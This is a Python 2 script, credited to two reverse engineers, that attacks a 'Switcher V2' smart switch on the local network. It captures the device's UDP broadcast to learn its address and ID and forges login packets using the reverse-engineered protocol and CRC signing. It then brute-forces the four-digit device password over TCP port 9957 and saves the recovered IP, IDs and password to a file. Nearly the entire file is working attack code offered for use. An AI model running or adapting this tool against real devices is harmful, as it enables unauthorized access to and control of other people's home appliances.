# Reverse Engineering and coding by Aviad Golan @AviadGolan and Shai Rod @NightRang3r

#!/usr/bin/env python

import binascii as ba
import time
import struct
import socket
import sys
import os
import datetime
import re
import signal

########## CHANGE TO YOUR PARAMS ##########
switcherIP = "0.0.0.0" 
device_id = "000000"
device_pass = "00000000"
UDP_IP = "0.0.0.0"
UDP_PORT = 20002
sCommand = "0"
########## DO NOT CHANGE BYOND THIS LINE  ##########

if len(sys.argv) != 2:
	print "\r\n********* Usage: ./" + sys.argv[0] + " phone_id *********\r\n"
	sys.exit()

phone_id = sys.argv[1]

def crcSignFullPacketComKey(pData, pKey):
	crc = ba.hexlify(struct.pack('>I', ba.crc_hqx(ba.unhexlify(pData), 0x1021)))
	pData = pData + crc[6:8] + crc[4:6]
	crc = crc[6:8] + crc[4:6] + ba.hexlify( pKey )
	crc = ba.hexlify(struct.pack('>I', ba.crc_hqx(ba.unhexlify(crc), 0x1021)))
	pData = pData + crc[6:8] + crc[4:6]
	return pData

def getTS():
	return ba.hexlify(struct.pack('<I', int(round(time.time())))) 

def sTimer(sMinutes):
    sSeconds = int(sMinutes) * 60
    sDelay = struct.pack('<I', sSeconds)
    return ba.hexlify(sDelay)


def sigint_handler(signum, frame):
	print '[+] Stopped...'
	sys.exit(0)

 
signal.signal(signal.SIGINT, sigint_handler)

############# DO NOT CHANGE ############
pSession = "00000000"
pKey = "00000000000000000000000000000000"
############# DO NOT CHANGE ############


print """
		=========================================================
	   	+ Switcher V2 Python                                    +
	 	+ Reverse Engineering and Coding By:                    +
	 	+ Aviad Golan (@AviadGolan) and Shai Rod (@NightRang3r) +
	 	=========================================================
	 """
	
try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
	sock.bind((UDP_IP, UDP_PORT))
	while True:
		print "[*] Waiting for broadcast from Switcher device..."
		data, addr = sock.recvfrom(1024) 
		if ba.hexlify(data)[0:4] != "fef0" and len(data) != 165:
				print "[!] Not a switcher broadcast message!"
		else:
			b = ba.hexlify(data)[152:160]
			ip_addr = int(b[6:8] + b[4:6] + b[2:4] + b[0:2] , 16)
			switcherIP = socket.inet_ntoa(struct.pack("<L", ip_addr))
			device_id = ba.hexlify(data)[36:42]
			print "[+] Device ID: " + device_id
			break

except Exception as e:
	print("[!] Something went wrong...")
	print "[!] " + str(e)

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((switcherIP, 9957)) 
	
	data = "fef052000232a100" + pSession + "340001000000000000000000"  + getTS() + "00000000000000000000f0fe1c00" + phone_id + "0000" + device_pass + "00000000000000000000000000000000000000000000000000000000"
	data = crcSignFullPacketComKey(data, pKey)
	print ("[*] Sending Login Packet to Switcher...")
	s.send(ba.unhexlify(data))
	res = s.recv(1024)
	pSession2 = ba.hexlify(res)[16:24]
	if not pSession2:
		s.close()
		print ("[!] Operation failed, Could not acquire SessionID, Please try again...")
		sys.exit()
	else:
		data = "fef0300002320103" + pSession2 + "340001000000000000000000" + getTS() + "00000000000000000000f0fe" + device_id + "00"
		data = crcSignFullPacketComKey(data, pKey)
		s.send(ba.unhexlify(data))
		res = s.recv(1024)
		print ("[+] Received SessionID: " + pSession2)	
		print "[+] Using Phone ID: " + phone_id
		brute_start = time.time()			
		for i in range(0, 9999):
			device_pass = ba.hexlify("%04d"%(i))
			sys.stdout.write("\r[*] Brute forcing Device Password, Please wait:" + device_pass)
			sys.stdout.flush()
			data = "fef05d0002320102" + pSession2 + "340001000000000000000000" + getTS() + "00000000000000000000f0fe" + device_id + "00" + phone_id + "0000" + device_pass + "000000000000000000000000000000000000000000000000000000000106000" + sCommand + "0000000000"
			data = crcSignFullPacketComKey(data, pKey)
			s.send(ba.unhexlify(data))
			res = s.recv(1024)
			if len(res) > 44 and len(res) < 60:
				brute_end = time.time()
				total_time= time.strftime("%H:%M:%S", time.gmtime(brute_end-brute_start))
				print "\r\n[+] Found password in: " + total_time
				print "[+] Switcher IP: " +  addr[0]
				print "[+] Device ID: " + device_id
				print "[+] Phone ID:" + phone_id
				print "[+] Device Password: " + device_pass
				s.close()
				file = open('switcher.txt', 'w') 
				file.write("switcherIP = " +  '"' + addr[0] + '"\r')
				file.write("phone_id = " + '"' +  phone_id + '"\r')
				file.write("device_id = " + '"' + device_id + '"\r')
				file.write("device_pass = " + '"' + device_pass + '"\r')
				file.close() 
				print "[+] Information was written to " + os.getcwd() + "/switcher.txt"
				sys.exit()
except Exception as e:
	print("[!] Something went wrong...")
	print "[!] " + str(e)


